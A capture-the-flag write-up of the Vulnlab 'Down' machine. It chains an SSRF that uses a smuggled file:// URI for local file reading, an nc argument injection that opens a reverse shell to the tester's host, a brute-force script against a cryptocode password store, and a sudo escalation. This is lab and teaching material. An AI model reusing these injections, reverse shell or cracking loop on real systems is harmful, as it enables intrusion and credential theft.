---
title: "Down - Vulnlab Writeup"
date: 2026-04-11 00:00:00 +0000
categories: [boxes]
tags: [vulnlab, linux, easy, ssrf, lfi, rce, cryptocode, privilege-escalation, sudo]
image:
  path: /assets/img/box/14/logo.png
  alt: Down Vulnlab Machine
---

![Machine Info](https://img.shields.io/badge/Difficulty-Easy-brightgreen) ![Machine Info](https://img.shields.io/badge/OS-Linux-blue)

<p align="center"> <img src="/assets/img/box/14/logo.png" width="150"/> </p>

**Platform:** Vulnlab | **OS:** Linux | **Difficulty:** Easy

---

## Machine Info

|Field|Details|
|---|---|
|Machine Name|Down|
|IP Address|10.129.234.87|
|OS|Linux (Ubuntu)|
|Attack Vector|SSRF → LFI → RCE → Password Cracking → PrivEsc|

---

## Step 1 — Reconnaissance

### Nmap Scan

```bash
nmap -sCV 10.129.234.87

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.11
80/tcp open  http    Apache httpd 2.4.52
           |_http-title: Is it down or just me?
```

Two ports open: SSH on 22 and Apache on 80.

### Directory Enumeration

```bash
gobuster dir -u http://down.vl/ \
  -w ~/seclists/Discovery/Web-Content/common.txt -t 40

/index.php      (Status: 200) [Size: 739]
/javascript      (Status: 301)
/server-status   (Status: 403)
```

---

## Step 2 — SSRF & Local File Inclusion

The app checks if a URL is up using `curl` internally. It requires an `http://` or `https://` prefix.

![SSRF poc1](/assets/img/box/14/poc1.png)

By injecting a space followed by a `file://` URI we bypass this restriction:

```
url=http://127.0.0.1 file:///etc/passwd
```

![SSRF LFI poc2](/assets/img/box/14/poc2.png)

The server returns `/etc/passwd`, confirming LFI via SSRF. We spot the user `aleks` with home at `/home/aleks`.
### Reading the Source Code

```
url=http://127.0.0.1 file:///var/www/html/index.php
```

Key findings from `index.php`:

- Default mode runs: `/usr/bin/curl -s $url` (no sanitisation)
- `expertmode=tcp` runs: `/usr/bin/nc -vz $ip $port` using `escapeshellcmd()`
- `escapeshellcmd()` does **not** prevent injection via spaces inside a single argument

---

## Step 3 — Remote Code Execution

### Command Injection via expertmode=tcp

The nc command is built as `/usr/bin/nc -vz $ip $port`. By appending `-e /bin/bash` to the port parameter we get a reverse shell:

```bash
# Start listener
nc -lvnp 4444

# Send payload
POST /index.php?expertmode=tcp

ip=10.10.14.158&port=4444%20-e%20/bin/bash
```

```bash
www-data@down:/$ whoami
www-data
```

---

## Step 4 — Lateral Movement

### Finding the pswm File

```bash
www-data@down:/home/aleks$ cat .local/share/pswm/pswm
e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==
```

The `*` delimiter format is characteristic of Python's `cryptocode` library (AES-256-GCM). The four parts are: ciphertext, salt, IV, and authentication tag.

### Cracking the Master Password

`cryptocode.decrypt()` returns `False` on a wrong password, making brute-force simple:

```python
import cryptocode

blob = open('pswm').read().strip()
with open('/usr/share/wordlists/rockyou.txt', errors='ignore') as f:
    for line in f:
        pw = line.strip()
        result = cryptocode.decrypt(blob, pw)
        if result is not False:
            print(f'[+] Password: {pw}')
            print(f'[+] Data:     {result}')
            break
```

```
[+] Password found: flower
[+] Decrypted data: pswm    aleks    flower
                    aleks@down    aleks    1uY3w22uc-Wr{xNHR~+E
```

### SSH as aleks

```bash
ssh aleks@10.129.234.87
# password: 1uY3w22uc-Wr{xNHR~+E

aleks@down:~$ whoami
aleks
```

---

## Step 5 — Privilege Escalation

```bash
aleks@down:~$ sudo -l

User aleks may run the following commands on down:
    (ALL : ALL) ALL
```

aleks can run any command as root:

```bash
aleks@down:~$ sudo /bin/bash

root@down:~# whoami
root
```
